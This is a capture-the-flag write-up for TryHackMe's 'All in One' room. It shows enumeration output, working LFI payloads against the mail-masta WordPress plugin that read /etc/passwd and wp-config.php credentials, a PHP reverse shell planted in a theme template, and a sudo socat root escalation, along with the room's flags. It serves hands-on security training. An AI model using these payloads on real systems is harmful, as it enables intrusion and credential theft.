## All in One - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/allinonemj)

<i>This box's intention is to help you practice several ways in exploiting a system. There is few intended paths to exploit it and few unintended paths to get root.

Try to discover and exploit them all. Do not just exploit it using intended paths, hack like a pro and enjoy the box !

Give the machine about 5 mins to fully boot.

Twitter: i7m4d</i>

**IP: 10.10.10.147**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Wpscan, Ffuf<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.10.147

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.5
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.5 - secure, fast, stable
  |_End of status
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 51:78:24:ed:40:f9:2e:0f:bb:cd:13:b1:23:19:b1:2b (RSA)
  |   256 5c:ff:d0:77:fd:28:cb:07:56:23:ff:d4:54:e0:f4:00 (ECDSA)
  |_  256 bc:b0:d9:8c:b9:b8:8f:c4:66:ba:e4:44:66:dd:b6:51 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.10.147/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  hackathons              [Status: 200, Size: 197, Words: 19, Lines: 64, Duration: 51ms]
  
  ffuf -u http://10.10.10.147/FUZZ -w /usr/share/wordlists/dirb/common.txt
  .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4515ms]
  .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4516ms]
  .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4536ms]
  index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 188ms]
  server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms]
  wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 48ms]
  ```
  
- OK, there is absolutely nothing in FTP. When I checked `/hackathons` I found this in the source code.

  ```
  <!-- Dvc W@iyur@123 -->
  <!-- KeepGoing -->
  ```
  
- This is Vigenere cipher, key is `KeepGoing`. Decoding it gave me `Try H@ckme@123`. It's not an SSH password so I continued looking.

- `http://10.10.10.147/wordpress/` this is the main page, built in WordPress. We have username there `elyana` and login page on `/wordpress/wp-login.php`. I ran wpscan to see what's actually going on there.

  ```
  wpscan --url http://10.10.10.147/wordpress -e ap,vt,u

  [i] Plugin(s) Identified:
  
  [+] mail-masta
   | Location: http://10.10.10.147/wordpress/wp-content/plugins/mail-masta/
   | Latest Version: 1.0 (up to date)
   | Last Updated: 2014-09-19T07:52:00.000Z
   |
   | Found By: Urls In Homepage (Passive Detection)
   |
   | Version: 1.0 (80% confidence)
   | Found By: Readme - Stable Tag (Aggressive Detection)
   |  - http://10.10.10.147/wordpress/wp-content/plugins/mail-masta/readme.txt
  
  [+] reflex-gallery
   | Location: http://10.10.10.147/wordpress/wp-content/plugins/reflex-gallery/
   | Latest Version: 3.1.7 (up to date)
   | Last Updated: 2021-03-10T02:38:00.000Z
   |
   | Found By: Urls In Homepage (Passive Detection)
   |
   | Version: 3.1.7 (80% confidence)
   | Found By: Readme - Stable Tag (Aggressive Detection)
   |  - http://10.10.10.147/wordpress/wp-content/plugins/reflex-gallery/readme.txt
  
  
  [+] elyana
   | Found By: Author Posts - Author Pattern (Passive Detection)
   | Confirmed By:
   |  Rss Generator (Passive Detection)
   |  Wp Json Api (Aggressive Detection)
   |   - http://10.10.10.147/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
   |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   |  Login Error Messages (Aggressive Detection)
  ```

---

## 🌐 Web Exploitation (if applicable)

- OK, so there is few ways for exploitation, I did it with LFI, there's also username `elyana` and friend of mine did it with Arbitrary File Upload. I googled this `mail-masta` plugin and found LFI exploit.
  You can check it [here](https://www.exploit-db.com/exploits/40290). After using the command from exploit, you can see the `/etc/passwd` file.

  ```
  http://10.10.10.147/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

  root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  [SNIP!]
  ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin systemd-timesync:x:113:116:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin tss:x:114:119:TPM software stack,,,:/var/lib/tpm:/bin/false tcpdump:x:115:120::/nonexistent:/usr/sbin/nologin
  usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin fwupd-refresh:x:117:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
  ```
  
- After that, it took some time to find the right exploit which will read the database config, here it is.

  ```
  http://10.10.10.147/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

  PD9waHANCi8qKg0[SNIP!]==
  ```
  
- This is a loooooooooooooooooooooooooong encoded string, decode it and you should be able to see full config file.

  ```
  [SNIP!]

  // ** MySQL settings - You can get this info from your web host ** //
  /** The name of the database for WordPress */
  define( 'DB_NAME', 'wordpress' );
  
  /** MySQL database username */
  define( 'DB_USER', 'elyana' );
  
  /** MySQL database password */
  define( 'DB_PASSWORD', 'H@ckme@123' );
  
  /** MySQL hostname */
  define( 'DB_HOST', 'localhost' );
  
  /** Database Charset to use in creating database tables. */
  define( 'DB_CHARSET', 'utf8mb4' );
  
  /** The Database Collate type. Don't change this if in doubt. */
  define( 'DB_COLLATE', '' );
  
  wordpress;
  define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
  define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
  
  [SNIP!]
  ```

- Nice, now login as `elyana` and put reverse shell on the website.

---

## ⚙️ Shell Access

- Here, I did the same thing like with `ColddBox: Easy` room (Do that one as well, it's pretty cool one). Go to Appearances -> Theme Editor -> 404 Templates. Delete all content in that template and paste your reverse shell there.
  You can use any PHP reverse shell that you like, in Kali you have one in `/usr/share/webshells/php`. Don't forget to put [YOUR-THM-IP] and Port in reverse shell before uploading it. After shell is uploaded, start a listener and purposely do 404 error.
  You can make 404 error anywhere you like, I did it on the blog page or whatever that is `http://10.10.10.147/wordpress/index.php/author/bimbo`

  ```
  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.10.147] 52342
  Linux ip-10-10-10-147 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
   13:19:45 up 41 min,  0 users,  load average: 0.10, 0.05, 0.21
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Since author `bimbo` doesnt exist on web page, it caused 404 which gave us a reverse shell. Pretty cool right?
  
- Change it to putty shell then chase can start.

---

## 🧍 User Privilege Escalation

- User flag is already there but you can't read it as `www-data`.

  ```
  www-data@ip-10-10-10-147:/home$ cd elyana/
  www-data@ip-10-10-10-147:/home/elyana$ ls -al
  total 48
  drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
  drwxr-xr-x 4 root   root   4096 May 16 12:38 ..
  -rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
  -rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
  -rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
  drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
  drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
  drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
  drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
  -rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
  -rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
  -rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
  -rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
  
  www-data@ip-10-10-10-147:/home/elyana$ cat user.txt 
  cat: user.txt: Permission denied
  
  www-data@ip-10-10-10-147:/home/elyana$ cat hint.txt 
  Elyana's user password is hidden in the system. Find it ;)
  ```
  
- Sure, let's find that password.

  ```
  www-data@ip-10-10-10-147:/$ find / -type f -user elyana 2>/dev/null
  /home/elyana/user.txt
  /home/elyana/.bash_logout
  /home/elyana/hint.txt
  /home/elyana/.bash_history
  /home/elyana/.profile
  /home/elyana/.sudo_as_admin_successful
  /home/elyana/.bashrc
  /etc/mysql/conf.d/private.txt
  
  www-data@ip-10-10-10-147:/$ cat /etc/mysql/conf.d/private.txt 
  user: elyana
  password: E@syR18ght
  ```
  
- GOTEM! Switch to `elyana` and read the first flag then move to escalation.

  ```
  www-data@ip-10-10-10-147:/$ su elyana
  Password: 
  elyana@ip-10-10-10-147:/$ cat /home/elyana/user.txt
  VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
  
  echo 'VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259' | base64 -d
  THM{49jg666alb5e76shrusn49jg666alb5e76shrusn} 
  ```

- Yeaaaah, decode the string to get the flag...

---

## 👑 Root Privilege Escalation

- For escalation, `sudo -l` will do the job for you, after that use the one-liner from GTFOBins and read the flag.

  ```
  elyana@ip-10-10-10-147:/$ sudo -l
  Matching Defaults entries for elyana on ip-10-10-10-147:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User elyana may run the following commands on ip-10-10-10-147:
      (ALL) NOPASSWD: /usr/bin/socat
  
  elyana@ip-10-10-10-147:/$ sudo socat stdin exec:/bin/sh
  whoami
  root
  id
  uid=0(root) gid=0(root) groups=0(root)
  cat /root/root.txt
  VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
  
  echo 'VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9' | base64 -d
  THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8} 
  ```
  
- Cya in the next one, peace! 🤙


---

## 🏁 Flags

- **User Flag**: `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`
- **Root Flag**: `THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding the right payloads, I did this room after doing ColddBox one and since they are pretty similar I knew my way around it.`

- What did I learn?
  `New exploitation methods.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
